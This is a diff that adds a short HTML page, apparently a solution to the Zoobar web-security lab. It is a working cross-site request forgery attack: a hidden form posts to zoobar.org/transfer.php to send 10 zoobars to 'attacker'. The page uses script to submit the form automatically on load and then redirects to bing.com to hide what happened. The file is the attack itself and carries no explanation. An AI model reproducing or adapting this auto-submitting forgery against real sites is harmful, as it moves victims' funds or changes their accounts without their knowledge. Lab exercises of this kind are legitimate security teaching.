@@ -1,0 +1,14 @@
+<html>
+<body>
+<form id="F" method='POST'
+action="http://zoobar.org/transfer.php">
+	<input type="text" name="zoobars" value="10" />
+	<input type="text" name="recipient" value="attacker" />
+	<input name="submission" type="submit" value="Send" id="button" />
+</form>
+<script>
+document.getElementById("button").click();
+setTimeout(function(){window.location.replace("http://www.bing.com");},10);
+</script>
+</body>
+</html>
